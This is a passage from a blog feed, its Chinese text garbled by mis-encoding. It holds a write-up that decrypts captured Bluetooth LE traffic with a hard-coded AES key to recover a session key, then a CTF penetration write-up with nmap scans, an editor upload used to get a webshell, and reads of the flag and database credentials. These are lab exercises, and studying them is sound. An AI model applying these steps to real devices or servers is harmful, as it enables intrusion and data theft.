Responseï¼‰è¿‡ç¨‹æ¥å®Œæˆã€‚<ul><li>è¿æ¥è¿‡ç¨‹é€šå¸¸åŒ…æ‹¬è®¾å¤‡åœ°å€äº¤æ¢ã€åå•†è¿æ¥å‚æ•°ï¼ˆå¦‚è¿æ¥é—´éš”ã€æ•°æ®åŒ…å¤§å°ç­‰ï¼‰ç­‰æ­¥éª¤</li><li>è¿æ¥å®Œæˆåï¼Œè®¾å¤‡é€šè¿‡æ•°æ®åŒ…äº¤æ¢è¿›è¡Œé€šä¿¡</li></ul></li><li>æ•°æ®ä¼ è¾“ï¼ˆData Exchangeï¼‰ï¼šåœ¨BLEè¿æ¥ä¸­ï¼Œæ•°æ®ä¼ è¾“æ˜¯é€šè¿‡æ•°æ®åŒ…è¿›è¡Œçš„ã€‚æ•°æ®åŒ…åŒ…å«äº†é€šä¿¡åŒæ–¹äº¤æ¢çš„æ•°æ®å†…å®¹ã€ç‰¹å¾å€¼ï¼ˆCharacteristicsï¼‰ç­‰ä¿¡æ¯ã€‚BLEæ”¯æŒé€šè¿‡GATTï¼ˆGeneric Attribute Profileï¼‰åè®®æ¥è¿›è¡Œæ•°æ®ä¼ è¾“ï¼ŒGATTå®šä¹‰äº†é€šä¿¡ä¸­çš„æœåŠ¡ï¼ˆServicesï¼‰ã€ç‰¹å¾ï¼ˆCharacteristicsï¼‰å’Œæè¿°ç¬¦ï¼ˆDescriptorsï¼‰ã€‚<ul><li>è¯»å–å’Œå†™å…¥æ“ä½œï¼šè®¾å¤‡å¯ä»¥é€šè¿‡GATTè¿›è¡Œå±æ€§è¯»å–ï¼ˆReadï¼‰æˆ–å†™å…¥ï¼ˆWriteï¼‰æ“ä½œï¼Œè¿™äº›æ“ä½œå¯ä»¥åº”ç”¨äºè®¾å¤‡çš„å„ç§ä¼ æ„Ÿå™¨æ•°æ®ã€é…ç½®ä¿¡æ¯ç­‰</li></ul></li><li>é…å¯¹ä¸åŠ å¯†ï¼ˆPairing and Encryptionï¼‰ï¼šBLEåè®®æ”¯æŒè®¾å¤‡é…å¯¹å’ŒåŠ å¯†æ“ä½œï¼Œä»¥æé«˜é€šä¿¡å®‰å…¨æ€§ã€‚é…å¯¹è¿‡ç¨‹ä¸­ï¼Œè®¾å¤‡äº¤æ¢é…å¯¹ä¿¡æ¯ï¼Œå¦‚åŠ å¯†å¯†é’¥æˆ–ç¡®è®¤ç ã€‚BLEæ”¯æŒå¤šç§å®‰å…¨æ¨¡å¼ï¼Œå¦‚ Just Worksã€Passkey Entry å’Œ Out of Bandï¼Œä»¥åŠåŠ å¯†æœºåˆ¶æ¥ä¿æŠ¤æ•°æ®å®‰å…¨ã€‚<ul><li>åŠ å¯†æ•°æ®ï¼šé€šè¿‡äº¤æ¢åŠ å¯†å¯†é’¥ï¼ŒBLEé€šä¿¡ä¸­çš„æ•°æ®æµå¯ä»¥è¢«åŠ å¯†ï¼Œä»¥é˜²æ­¢æ¶æ„ç›‘å¬å’Œæ•°æ®ç¯¡æ”¹ã€‚</li></ul></li><li>æ–­å¼€è¿æ¥ï¼ˆDisconnectionï¼‰ï¼šåœ¨BLEè®¾å¤‡å®Œæˆæ•°æ®äº¤æ¢åï¼Œå¯ä»¥é€šè¿‡å‘é€æ–­å¼€è¿æ¥çš„å‘½ä»¤ï¼ˆDisconnection Requestï¼‰æ¥ä¸­æ­¢è¿æ¥ã€‚è®¾å¤‡ä¹‹é—´çš„è¿æ¥é€šå¸¸æ˜¯çŸ­æš‚çš„ï¼Œè®¾è®¡ä¸Šæ˜¯ä¸ºäº†é™ä½èƒ½è€—</li></ul><hr><h2 id="å‰ç½®æ¡ä»¶"><a href="#å‰ç½®æ¡ä»¶" class="headerlink" title="å‰ç½®æ¡ä»¶"></a>å‰ç½®æ¡ä»¶</h2><p>é€šè¿‡é€†å‘è¯¥è®¾å¤‡çš„ app å¯çŸ¥ï¼Œapp ä¸è®¾å¤‡çš„äº¤äº’ä½¿ç”¨äº† session_key ä½œä¸ºæ¯æ¬¡è¿æ¥åçš„AESä¼šè¯å¯†é’¥ï¼Œè¿™ä¸ªå¯†é’¥åœ¨æ¯æ¬¡è¿æ¥é…å¯¹æ—¶äº¤æ¢äº§ç”Ÿï¼Œåœ¨æ¯æ¬¡æ–­è”åè¢«åºŸå¼ƒï¼Œä¸‹æ¬¡é‡æ–°ç”Ÿæˆ</p><p>session_key ç”Ÿæˆè§„åˆ™ï¼š</p><ol><li><p>appä¸è®¾å¤‡å»ºç«‹è¿æ¥ï¼Œäº¤æ¢è®¾å¤‡å‹å·ç‰ˆæœ¬ç­‰å¿…è¦ä¿¡æ¯ã€‚</p></li><li><p>appè®¢é˜…æ™ºèƒ½è®¾å¤‡UUIDä¸º <code>bd4ac6100b4511e38ffd0800200c9a66</code> çš„Indicationã€‚</p></li><li><p>ç”± app å…ˆç”Ÿæˆ 8 byte çš„éšæœºæ•°Aï¼Œç”±æ§åˆ¶å­—ç¬¦ <code>01000000 +[8 byteéšæœºæ•°A]+[4 byteå…¶ä»–å­—ç¬¦]</code> ç»„æˆä¸€ä¸ªæŒ‡ä»¤ï¼Œç”±å›ºå®šå¯†é’¥ <code>2eacd8f48c2dfe15325f25ad8fc8eb96</code> åŠ å¯†åï¼ŒåŠ ä¸Š 2 Byte çš„CRCå†…å®¹ï¼ˆæœ‰æ•ˆæ•°æ®ä¸ºå‰ 16 byteï¼‰ï¼ŒWrite ç»™ç›®æ ‡è®¾å¤‡ UUID ä¸º<code>bd4ac6100b4511e38ffd0800200c9a66</code> çš„æœåŠ¡ã€‚</p></li><li><p>æ™ºèƒ½è®¾å¤‡æ”¶åˆ°ä¸Šè¿°æŒ‡ä»¤åï¼Œç”Ÿæˆ 8 byte çš„éšæœºæ•°Bï¼Œç”±æ§åˆ¶å­—ç¬¦ <code>02000000 +[8 byteéšæœºæ•°B]+[4byteå…¶ä»–å­—ç¬¦]</code> ç»„åˆæŒ‡ä»¤ï¼Œç”±å›ºå®šå¯†é’¥ <code>2eacd8f48c2dfe15325f25ad8fc8eb96</code> åŠ å¯†åï¼ŒåŠ ä¸Š 2 Byte çš„å…¶ä»–æ•°æ®ï¼ˆæœ‰æ•ˆæ•°æ®ä¸ºå‰ 16 byteï¼‰ï¼Œé€šè¿‡ Indicate è®¢é˜…è¿”è¿˜ç»™appã€‚</p></li><li><p>appä¸æ™ºèƒ½è®¾å¤‡å®Œæˆå¯†é’¥äº¤æ¢ï¼Œä»¤ <code>session_key=A+B</code> ï¼Œå³ä¸ºæœ¬æ¬¡é€šä¿¡ä½¿â½¤çš„ AES å¯†é’¥ï¼Œæœ¬æ¬¡ä¼šè¯åç»­æ‰€æœ‰é€šä¿¡å‡ç”± session_key è¿›è¡ŒåŠ å¯†åå†ä¼ è¾“ã€‚</p></li></ol><h2 id="æ­¥éª¤-3"><a href="#æ­¥éª¤-3" class="headerlink" title="æ­¥éª¤"></a>æ­¥éª¤</h2><ol><li><p>ç”¨ Wireshark åˆ†ææ— çº¿ç”µå—…æ¢è®¾å¤‡æ•è·çš„æ•°æ®åŒ…</p><p><img src="/blog/2024/11/26/%E9%A2%91%E8%B0%B1%E5%88%86%E6%9E%90/image-20241202212132680.png" alt="image-20241202212132680"></p><p>æœ‰æ˜¾ç¤ºé€šä¿¡æ¥æºã€ç›®çš„åœ°ã€BLEæ•°æ®åŒ…ç±»å‹ï¼Œä¾‹å¦‚ ADV_IND æ˜¯ BLE åè®®ä¸­æœ€å¸¸è§çš„å¹¿æ’­ç±»å‹ï¼Œä¸»è¦ç”¨äºè®¾å¤‡çš„å¯å‘ç°å¹¿æ’­</p><p>è¿™ç§æ•°æ®åŒ…ç”¨äºé€šçŸ¥é™„è¿‘çš„è®¾å¤‡å®ƒçš„å­˜åœ¨ï¼Œå¸¸è§äºè®¾å¤‡å¸Œæœ›è®©å…¶ä»–è®¾å¤‡å‘ç°å¹¶è¿æ¥åˆ°å®ƒæ—¶ã€‚ä¾‹å¦‚ï¼Œå½“â¼€ä¸ª BLE è®¾å¤‡å¯åŠ¨å¹¶å¸Œæœ›è¢«å…¶ä»–è®¾å¤‡å‘ç°æ—¶ï¼Œå®ƒä¼šå‘é€ ADV_IND ç±»å‹çš„å¹¿æ’­åŒ…ã€‚</p><p><img src="/blog/2024/11/26/%E9%A2%91%E8%B0%B1%E5%88%86%E6%9E%90/image-20241202213408567.png" alt="image-20241202213408567"></p><p>å±•å¼€ Bluetooth Attribute Protocol é€‰é¡¹æ ‘ï¼Œå¯ä»¥çœ‹åˆ°è¯¦ç»†çš„åº”ç”¨å±‚ä¿¡æ¯ã€‚ä¾‹å¦‚92å·æ•°æ®åŒ…æ˜¯äº¤æ¢è®¾å¤‡åç§°ç­‰å˜é‡</p><p><img src="/blog/2024/11/26/%E9%A2%91%E8%B0%B1%E5%88%86%E6%9E%90/image-20241202213621082.png" alt="image-20241202213621082"></p><p>æœ€ç»ˆæ‰¾åˆ°216å·æ•°æ®åŒ…ï¼Œé€†å‘appåå·²çŸ¥çš„äº¤æ¢éšæœºæ•°å¯†é’¥çš„ Service UUIDï¼š<code>bd4ac6100b4511e38ffd0800200c9a66</code></p><p><img src="/blog/2024/11/26/%E9%A2%91%E8%B0%B1%E5%88%86%E6%9E%90/image-20241202213743333.png" alt="image-20241202213743333"></p></li><li><p>è§£å¯†å¹¶è¿˜åŸ session_key</p><p>key ç”¨çš„æ˜¯å‰é¢é€†å‘å¾—åˆ°çš„ 2eacd8f48c2dfe15325f25ad8fc8eb96</p><p>iv ç”¨0å¡«å……</p><p>CBC&#x2F;NoPadding æ¨¡å¼</p><p><img src="/blog/2024/11/26/%E9%A2%91%E8%B0%B1%E5%88%86%E6%9E%90/image-20241202214653482.png" alt="image-20241202214653482"></p><p><img src="/blog/2024/11/26/%E9%A2%91%E8%B0%B1%E5%88%86%E6%9E%90/image-20241202214712162.png" alt="image-20241202214712162"></p><p>å¾—åˆ° A ä¸º c2f4c40274acbc32</p><p>åœ¨220å·æ•°æ®åŒ…æ‹¿åˆ°å¦ä¸€ä¸ªUUID</p><p><img src="/blog/2024/11/26/%E9%A2%91%E8%B0%B1%E5%88%86%E6%9E%90/image-20241202214325525.png" alt="image-20241202214325525"></p><p>åŒæ ·è§£å¯†å¾—åˆ° B ä¸º 616b507c0e066eee</p><p>é‚£ä¹ˆå¾—åˆ° session_key &#x3D; A + B &#x3D; c2f4c40274acbc32616b507c0e066eee</p><p>ç»§ç»­æ‰¾åˆ°â¼€ä¸ªåç»­çš„äº¤äº’æ•°æ®åŒ…ï¼Œå°è¯•ç”¨è¿™ä¸ª session_key è§£å¯†</p><p><img src="/blog/2024/11/26/%E9%A2%91%E8%B0%B1%E5%88%86%E6%9E%90/image-20241202214844605.png" alt="image-20241202214844605"></p><p><img src="/blog/2024/11/26/%E9%A2%91%E8%B0%B1%E5%88%86%E6%9E%90/image-20241202214831498.png" alt="image-20241202214831498"></p><p><img src="/blog/2024/11/26/%E9%A2%91%E8%B0%B1%E5%88%86%E6%9E%90/image-20241202214925813.png" alt="image-20241202214925813"></p><p>è¯´æ˜ c2f4c40274acbc32616b507c0e066eee å°±æ˜¯åŠ å¯†åç»­ BLE æ•°æ®åŒ…çš„æœ‰æ•ˆ session_key</p></li></ol>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h1&gt;&lt;p&gt;è²Œä¼¼éƒ½æ˜¯æ— çº¿ç”µæ–¹é¢çš„&lt;/p&gt;</summary>
    
    
    
    <category term="æ‚é¡¹" scheme="http://c1oudfl0w0.github.io/blog/categories/%E6%9D%82%E9%A1%B9/"/>
    
    
  </entry>
  
  <entry>
    <title>2024ç½‘é¼æ¯åŠå†³èµ›</title>
    <link href="http://c1oudfl0w0.github.io/blog/2024/11/23/2024%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B/"/>
    <id>http://c1oudfl0w0.github.io/blog/2024/11/23/2024%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B/</id>
    <published>2024-11-23T01:50:26.000Z</published>
    <updated>2024-12-03T08:53:24.618Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>è°å·èµ°äº†æˆ‘çš„äº‘æ”¯ä»˜é¦–é¡µæ‰‹æœºå·å¼±å¯†ç ç™»å½•ï¼</p><p>ctfæ²¡æœ‰webï¼Œ<del>æ¸—é€è¿˜å¯„äº†</del>ï¼Œå¯æƒœé˜Ÿå‹å®‰å…¨è¿è¥ä¸€ä¸ªç¬¬3ä¸€ä¸ªç¬¬8äº†ï¼Œé—æ†¾é€€åœº</p><p>å‚è€ƒï¼š<a href="https://blog.csdn.net/qq_30817059/article/details/144030914#t5">https://blog.csdn.net/qq_30817059/article/details/144030914#t5</a></p><span id="more"></span><hr><h1 id="æ¸—é€"><a href="#æ¸—é€" class="headerlink" title="æ¸—é€"></a>æ¸—é€</h1><h1 id="ipæ¢æµ‹"><a href="#ipæ¢æµ‹" class="headerlink" title="ipæ¢æµ‹"></a>ipæ¢æµ‹</h1><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">114.114.114.1 æ˜¯å­˜æ´»åœ°å€114.114.114.20 æ˜¯å­˜æ´»åœ°å€- åœ¨çº¿å®¢æœç³»ç»Ÿ//114.114.114.44 æ˜¯å­˜æ´»åœ°å€- å·¥å…·å¹³å°//114.114.114.55 æ˜¯å­˜æ´»åœ°å€//114.114.114.88 æ˜¯å­˜æ´»åœ°å€114.114.114.100 æ˜¯å­˜æ´»åœ°å€- 80 - è‡´å¯Œå›½é™…114.114.114.199 æ˜¯å­˜æ´»åœ°å€- 80 - æ’ä¸°IPO114.114.114.229 æ˜¯å­˜æ´»åœ°å€- 44514 - äº‘æ”¯ä»˜114.114.114.253 æ˜¯å­˜æ´»åœ°å€114.114.114.254 æ˜¯å­˜æ´»åœ°å€<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="é¦–é¡µå…¥å£-114-114-114-100"><a href="#é¦–é¡µå…¥å£-114-114-114-100" class="headerlink" title="é¦–é¡µå…¥å£-114.114.114.100"></a>é¦–é¡µå…¥å£-114.114.114.100</h1><h2 id="appé€†å‘"><a href="#appé€†å‘" class="headerlink" title="appé€†å‘"></a>appé€†å‘</h2><p><img src="/blog/2024/11/23/2024%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B/image-20241203150821945.png" alt="image-20241203150821945"></p><p>é¦–é¡µäºŒç»´ç æ‰«å‡ºæ¥çš„é“¾æ¥ä¸º</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;114.114.114.100&#x2F;apk&#x2F;apk-release.apk<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>åç¼–è¯‘apkï¼Œæœflag</p><p><img src="/blog/2024/11/23/2024%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B/image-20241123100357678.png" alt="image-20241123100357678"></p><h2 id="æ‰«æ"><a href="#æ‰«æ" class="headerlink" title="æ‰«æ"></a>æ‰«æ</h2><p><img src="/blog/2024/11/23/2024%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B/image-20241203151225193.png" alt="image-20241203151225193"></p><p>æ²¡ä¸œè¥¿</p><p>nmap</p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">PORT      STATE SERVICE    VERSION25/tcp    open  tcpwrapped|_smtp-commands: Couldn't establish connection on port 2553/tcp    open  tcpwrapped80/tcp    open  http       nginx|_http-title: \xE8\x87\xB4\xE5\xAF\x8C\xE5\x9B\xBD\xE9\x99\x85110/tcp   open  tcpwrapped111/tcp   open  rpcbind    2-4 (RPC #100000)| rpcinfo: |   program version    port/proto  service|   100000  2,3,4        111/tcp   rpcbind|   100000  2,3,4        111/udp   rpcbind|   100000  3,4          111/tcp6  rpcbind|   100000  3,4          111/udp6  rpcbind|   100003  3,4         2049/tcp   nfs|   100003  3,4         2049/tcp6  nfs|   100005  1,2,3      32780/tcp   mountd|   100005  1,2,3      32780/tcp6  mountd|   100005  1,2,3      32780/udp   mountd|   100005  1,2,3      32780/udp6  mountd|   100021  1,3,4      32777/tcp   nlockmgr|   100021  1,3,4      32777/tcp6  nlockmgr|   100021  1,3,4      32777/udp   nlockmgr|   100021  1,3,4      32777/udp6  nlockmgr|   100024  1          32778/tcp   status|   100024  1          32778/tcp6  status|   100024  1          32778/udp   status|_  100024  1          32778/udp6  status2049/tcp  open  nfs        3-4 (RPC #100003)32780/tcp open  mountd     1-3 (RPC #100005)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="æ’æ±‡IPO-114-114-114-199ï¼ˆå¤ç°ï¼‰"><a href="#æ’æ±‡IPO-114-114-114-199ï¼ˆå¤ç°ï¼‰" class="headerlink" title="æ’æ±‡IPO-114.114.114.199ï¼ˆå¤ç°ï¼‰"></a>æ’æ±‡IPO-114.114.114.199ï¼ˆå¤ç°ï¼‰</h1><p><img src="/blog/2024/11/23/2024%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B/image-20241203151014947.png" alt="image-20241203151014947"></p><p>æ¨¡å—æ¶æ„çš„è®¿é—®æ–¹å¼ï¼Œdirsearchæ‰«ä¸å‡ºæœ‰ä»·å€¼çš„ä¿¡æ¯</p><p>æµ‹å‡ºä¸€ä¸ªadminæ¨¡å—</p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">http</span><span class="token punctuation">:</span><span class="token header-value">//114.114.114.199/index.php?mod=admin&amp;act=login</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2024/11/23/2024%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B/image-20241203153801724.png" alt="image-20241203153801724"></p><p>å¼±å¯†ç çˆ†ç ´æ— æœï¼Œå°è¯•sqlæ³¨å…¥ï¼Œå‘ç°å§æ§½æŒ‚äº†ä¸ªG01</p><p><img src="/blog/2024/11/23/2024%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B/image-20241203162440194.png" alt="image-20241203162440194"></p><p>æµ‹è¯•è¿˜å‘ç°å­˜åœ¨mobileæ¨¡å—ï¼Œè¿˜æœ‰ä¸€ä¸ªaæ¨¡å—ï¼Œä¸çŸ¥é“ä¸ºä»€ä¹ˆè®¿é—®aæ¨¡å—ä¼šå¯¼è‡´æœåŠ¡è¢«é‡å¯ï¼ˆ</p><p>mobileæ¨¡å—é‡Œé¢æ²¡æœ‰ä»€ä¹ˆå¯ä»¥åˆ©ç”¨çš„ä¸œè¥¿</p><h2 id="æ‰«æ-1"><a href="#æ‰«æ-1" class="headerlink" title="æ‰«æ"></a>æ‰«æ</h2><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">PORT      STATE    SERVICE    VERSION25/tcp    open     tcpwrapped|_smtp-commands: Couldn't establish connection on port 2553/tcp    open     tcpwrapped80/tcp    open     http       wdb| http-title: \xE6\x81\x92\xE6\xB1\x87IPO - \xE7\x94\xA8\xE6\x88\xB7\xE7\x99\xBB\xE9\x99\x86|_Requested resource was /index.php?mod=member&amp;act=login&amp;url=P21vZD1tZW1iZXI=| http-cookie-flags: |   /: |     PHPSESSID: |_      httponly flag not set|_http-server-header: wdb| fingerprint-strings: |   GetRequest: |     HTTP/1.1 302 Found|     Date: Sat, 23 Nov 2024 02:52:35 GMT|     Server: wdb|     Set-Cookie: PHPSESSID=9bhitpr8oir6tjjh61804b9bp7; path=/|     Expires: Thu, 19 Nov 1981 08:52:00 GMT|     Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0|     Pragma: no-cache|     Location: /index.php?mod=member|     Content-Length: 0|     Connection: close|     Content-Type: text/html;charset=utf-8|   HTTPOptions: |     HTTP/1.1 404 Not Found|     Date: Sat, 23 Nov 2024 02:52:36 GMT|     Server: wdb|     Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0|     Content-Length: 9545|     Connection: close|     Content-Type: text/html; charset=UTF-8|     &lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">&lt;html xmlns="http://www.w3.org/1999/xhtml">&lt;head>&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />&lt;meta http-equiv="Cache-Control" content="no-store, no-cache, must-revalidate, post-check=0, pre-check=0"/>&lt;meta http-equiv="Connection" content="Close"/>&lt;title>&amp;#x7F51;&amp;#x7AD9;&amp;#x9632;&amp;#x706B;&amp;#x5899;&lt;/title>&lt;style type="text/css">a,img,h1,body,p&#123; margin:0; padding:0; list-style:none; border:none;&#125;body&#123; font-family:|     font-size:12px; background:#fff;&#125;table&#123; margin: 0; padding: 0; width: 100%;&#125;a:hover, a:link,|   RTSPRequest: |     HTTP/1.1 400 Bad Request|     Date: Sat, 23 Nov 2024 02:52:36 GMT|     Server: wdb|     Content-Length: 226|     Connection: close|     Content-Type: text/html; charset=iso-8859-1|     &lt;!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">|     &lt;html>&lt;head>|     &lt;title>400 Bad Request&lt;/title>|     &lt;/head>&lt;body>|     &lt;h1>Bad Request&lt;/h1>|     &lt;p>Your browser sent a request that this server could not understand.&lt;br />|     &lt;/p>|_    &lt;/body>&lt;/html>110/tcp   open     tcpwrapped111/tcp   open     rpcbind    2-4 (RPC #100000)| rpcinfo: |   program version    port/proto  service|   100000  2,3,4        111/tcp   rpcbind|   100000  2,3,4        111/udp   rpcbind|   100000  3,4          111/tcp6  rpcbind|   100000  3,4          111/udp6  rpcbind|   100003  3,4         2049/tcp   nfs|   100003  3,4         2049/tcp6  nfs|   100005  1,2,3      32780/tcp   mountd|   100005  1,2,3      32780/tcp6  mountd|   100005  1,2,3      32780/udp   mountd|   100005  1,2,3      32780/udp6  mountd|   100021  1,3,4      32777/tcp   nlockmgr|   100021  1,3,4      32777/tcp6  nlockmgr|   100021  1,3,4      32777/udp   nlockmgr|   100021  1,3,4      32777/udp6  nlockmgr|   100024  1          32778/tcp   status|   100024  1          32778/tcp6  status|   100024  1          32778/udp   status|_  100024  1          32778/udp6  status514/tcp   filtered shell2049/tcp  open     nfs        3-4 (RPC #100003)7681/tcp  open     unknown| fingerprint-strings: |   GetRequest, HTTPOptions, RTSPRequest: |     HTTP/1.0 200 OK|     server: ttyd/1.6.3 (libwebsockets/4.2.1-09e6c20)|     content-type: text/html|     content-length: 464459|_    &lt;!DOCTYPE html>&lt;html lang="en">&lt;head>&lt;meta charset="UTF-8">&lt;meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">&lt;title>ttyd - Terminal&lt;/title>&lt;link rel="icon" type="image/png" href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAcCAYAAAAAwr0iAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAA0xpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuNi1jMDY3IDc5LjE1Nzc0NywgMjAxNS8wMy8zMC0yMzo0MDo0MiAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wTU09Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9tbS8iIHhtbG5zOnN0UmVmPSJodHRwOi8vb8620/tcp  open     unknown| fingerprint-strings: |   DNSStatusRequestTCP, DNSVersionBindReqTCP, GetRequest, HTTPOptions, Help, Kerberos, RPCCheck, RTSPRequest, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServerCookie: |     HTTP/1.1 200 WebSocket|     Server: workerman/4.0.27|_    &lt;div style="text-align:center">&lt;h1>WebSocket&lt;/h1>&lt;hr>workerman/4.0.27&lt;/div>32777/tcp open     nlockmgr   1-4 (RPC #100021)32778/tcp open     status     1 (RPC #100024)32780/tcp open     mountd     1-3 (RPC #100005)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="ç¼–è¾‘å™¨getshell"><a href="#ç¼–è¾‘å™¨getshell" class="headerlink" title="ç¼–è¾‘å™¨getshell"></a>ç¼–è¾‘å™¨getshell</h2><p>é€šè¿‡ä¿¡æ¯æ”¶é›†å‘ç° admin æ¨¡å—ä¸‹å­˜åœ¨ä¸€ä¸ª shop actionï¼Œæ˜¯ä¸ªç¼–è¾‘å™¨ï¼Œå¯ä»¥æ–‡ä»¶ä¸Šä¼ </p><p><img src="/blog/2024/11/23/2024%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B/image-20241203163218111.png" alt="image-20241203163218111"></p><p><img src="/blog/2024/11/23/2024%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B/image-20241203163253822.png" alt="image-20241203163253822"></p><p>rceå‡½æ•°éƒ½è¢«ç¦ç”¨,ä½†æ˜¯ file_get_contents ä»¥åŠ readfile ç­‰è¯»å–å‡½æ•°æ²¡æœ‰è¢«ç¦ç”¨ï¼Œäºæ˜¯å¯ä»¥æ‹¿åˆ° flag</p><h2 id="è¿æ¥æ•°æ®åº“"><a href="#è¿æ¥æ•°æ®åº“" class="headerlink" title="è¿æ¥æ•°æ®åº“"></a>è¿æ¥æ•°æ®åº“</h2><p>é€šè¿‡æ–‡ä»¶è¯»å–è¯»åˆ°æ•°æ®åº“çš„é…ç½®ï¼Œè·å–åˆ°è´¦å¯†</p><p>åæ­£ getshell äº†ï¼Œèšå‰‘è¿ä¸Šå»ï¼Œç”¨phpè¿æ¥æ•°æ®åº“åº”è¯¥ä¹Ÿä¸æ˜¯ä»€ä¹ˆé—®é¢˜</p><hr><h1 id="äº‘æ”¯ä»˜-114-114-114-229-44514"><a href="#äº‘æ”¯ä»˜-114-114-114-229-44514" class="headerlink" title="äº‘æ”¯ä»˜-114.114.114.229:44514"></a>äº‘æ”¯ä»˜-114.114.114.229:44514</h1><p><img src="/blog/2024/11/23/2024%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B/image-20241203151625344.png" alt="image-20241203151625344"></p><h2 id="æ‰«æ-2"><a href="#æ‰«æ-2" class="headerlink" title="æ‰«æ"></a>æ‰«æ</h2><p><img src="/blog/2024/11/23/2024%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B/db76b484-1d8e-403a-93e9-f69d3dff6ede.png" alt="db76b484-1d8e-403a-93e9-f69d3dff6ede"></p><p>å­˜åœ¨flag.phpï¼Œå¯ä»¥å°è¯•æ‰¾ä¸ªæ–‡ä»¶è¯»å–</p><p>è®¿é—® admin ä¸‹çš„æ‰€æœ‰æ–‡ä»¶éƒ½ä¼šè¢«é‡å®šå‘åˆ° admin&#x2F;login.php</p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">PORT      STATE SERVICE    VERSION25/tcp    open  tcpwrapped|_smtp-commands: Couldn't establish connection on port 2553/tcp    open  tcpwrapped80/tcp    open  http       nginx|_http-title: \xE6\xB2\xA1\xE6\x9C\x89\xE6\x89\xBE\xE5\x88\xB0\xE7\xAB\x99\xE7\x82\xB9110/tcp   open  tcpwrapped111/tcp   open  rpcbind    2-4 (RPC #100000)| rpcinfo: |   program version    port/proto  service|   100000  2,3,4        111/tcp   rpcbind|   100000  2,3,4        111/udp   rpcbind|   100000  3,4          111/tcp6  rpcbind|   100000  3,4          111/udp6  rpcbind|   100003  3,4         2049/tcp   nfs|   100003  3,4         2049/tcp6  nfs|   100005  1,2,3      32780/tcp   mountd|   100005  1,2,3      32780/tcp6  mountd|   100005  1,2,3   